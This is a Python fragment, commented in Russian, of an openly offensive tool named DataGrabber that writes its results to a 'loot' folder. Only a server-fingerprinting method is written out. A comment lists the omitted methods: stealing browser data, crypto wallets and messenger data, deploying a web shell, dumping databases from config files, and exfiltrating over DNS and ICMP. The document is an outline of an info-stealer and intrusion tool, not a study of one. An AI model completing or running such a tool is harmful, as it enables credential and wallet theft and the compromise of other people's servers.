import asyncio, aiohttp, os, re, zipfile, io, base64, subprocess, shutil, glob, socket
from datetime import datetime

LOOT_DIR = "loot"

class DataGrabber:
    def __init__(self, log_func=None):
        self.log = log_func or print
        self.session = None

    async def __aenter__(self):
        self.session = aiohttp.ClientSession()
        return self

    async def __aexit__(self, exc_type, exc_val, exc_tb):
        if self.session:
            await self.session.close()

    async def detect_server(self, ip, port):
        """Определяет тип сервера по заголовку Server."""
        try:
            async with self.session.get(f'http://{ip}:{port}/', timeout=5, ssl=False) as resp:
                server = resp.headers.get('Server', '')
                if 'apache' in server.lower():
                    return 'Apache'
                elif 'nginx' in server.lower():
                    return 'Nginx'
                elif 'iis' in server.lower() or 'microsoft' in server.lower():
                    return 'IIS'
                else:
                    return server or 'Unknown'
        except:
            return 'Unknown'

    # ... (все остальные методы grab_common_files, deep_system_scan, grab_browser_data, grab_crypto_wallets, grab_messenger_data, deploy_web_shell, dump_database_from_config, scan_git_repository, traverse_directories, grab_session_files, exfiltrate_via_dns, exfiltrate_via_icmp) остаются без изменений, как в предыдущей полной версии.
